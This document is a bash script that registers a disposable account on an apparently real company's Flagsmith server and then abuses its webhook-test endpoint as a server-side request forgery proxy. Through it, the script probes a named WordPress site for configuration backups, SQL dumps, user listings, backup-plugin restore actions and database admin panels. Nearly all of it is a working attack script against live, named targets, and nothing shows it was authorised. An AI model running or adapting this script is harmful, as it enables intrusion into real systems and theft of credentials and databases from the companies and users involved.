#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
IP=$(curl -s https://ifconfig.me --max-time 5)
echo "IP: $IP"

# Register fresh Flagsmith account
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"email\":\"kw-v31-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "Key: $KEY"
if [ -z "$KEY" ]; then echo "REG FAILED: $ACCT"; exit 1; fi

# Setup org/project/env
OID=$(curl -s "https://flagsmith.koinworks.com/api/v1/organisations/" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10 | python3 -c "import json,sys; d=json.load(sys.stdin); r=d.get('results',[]); print(r[0]['id'] if r else '')" 2>/dev/null)
PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"p\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"e\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
echo "Env: $EKEY"

ssrf() {
  local URL="$1"
  local LABEL="$2"
  local R=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$URL\",\"secret\":\"\"}" --max-time 30)
  echo "$LABEL -> $R"
}

echo "=== WP-CONFIG BACKUP FILES ==="
ssrf "http://koinp2p.com/wp-config.php.bak" "wp-config.bak"
ssrf "http://koinp2p.com/wp-config.php.old" "wp-config.old"
ssrf "http://koinp2p.com/wp-config.php~" "wp-config-tilde"
ssrf "http://koinp2p.com/wp-config.php.save" "wp-config.save"
ssrf "http://koinp2p.com/wp-config.php.orig" "wp-config.orig"
ssrf "http://koinp2p.com/.wp-config.php.swp" "wp-config.swp"
ssrf "http://koinp2p.com/wp-config.php.txt" "wp-config.txt"
ssrf "http://koinp2p.com/wp-config.bak" "wp-config2.bak"
ssrf "http://koinp2p.com/wp-config.old" "wp-config2.old"
ssrf "http://koinp2p.com/wp-config-sample.php" "wp-config-sample"

echo "=== WP-CONFIG VIA INCLUDE (PHP Error) ==="
# Some WP configs include files that might error and leak info
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=heartbeat" "heartbeat"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=nopriv_heartbeat" "nopriv-heartbeat"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=wp_ajax_nopriv_heartbeat" "nopriv-heartbeat2"

echo "=== ADMIN-AJAX NOPRIV (CRITICAL) ==="
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_ajaxrestore&updraftplus_ajax_restore=start_ajax_restore" "updraft-restore"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=updraftcentral_receivepublickey" "updraft-recvkey"

echo "=== WP REST API ==="
ssrf "http://koinp2p.com/wp-json/" "rest-root"
ssrf "http://koinp2p.com/wp-json/wp/v2/users" "rest-users"
ssrf "http://koinp2p.com/wp-json/wp/v2/posts" "rest-posts"
ssrf "http://koinp2p.com/wp-json/wp/v2/users?context=edit" "rest-users-edit"
ssrf "http://koinp2p.com/wp-json/wp/v2/settings" "rest-settings"

echo "=== FILE READ ATTEMPTS ==="
# PHP file wrappers via include might work if there's a LFI
ssrf "http://koinp2p.com/wp-content/plugins/updraftplus/readme.txt" "udp-readme"
ssrf "http://koinp2p.com/wp-content/plugins/code-snippets/readme.txt" "cs-readme"
ssrf "http://koinp2p.com/wp-content/plugins/user-role-editor/readme.txt" "ure-readme"
ssrf "http://koinp2p.com/readme.html" "wp-readme"

echo "=== PHP INFO + BACKUP ==="
ssrf "http://koinp2p.com/info.php" "info"
ssrf "http://koinp2p.com/phpinfo.php" "phpinfo" 
ssrf "http://koinp2p.com/test.php" "test"
ssrf "http://koinp2p.com/backup.sql" "backup-sql"
ssrf "http://koinp2p.com/dump.sql" "dump-sql"
ssrf "http://koinp2p.com/db.sql" "db-sql"
ssrf "http://koinp2p.com/database.sql" "database-sql"
ssrf "http://koinp2p.com/.htaccess" "htaccess"

echo "=== MYSQL DIRECT (from koinp2p.com host) ==="
# Can't send binary protocol via HTTP SSRF, but test if there's a phpMyAdmin or similar
ssrf "http://koinp2p.com:3306/" "mysql-direct"
ssrf "http://koinp2p.com/phpmyadmin/" "phpmyadmin"
ssrf "http://koinp2p.com/pma/" "pma"
ssrf "http://koinp2p.com/dbadmin/" "dbadmin"
ssrf "http://koinp2p.com/adminer.php" "adminer"
ssrf "http://koinp2p.com/adminer/" "adminer-dir"

echo "=== DONE ==="
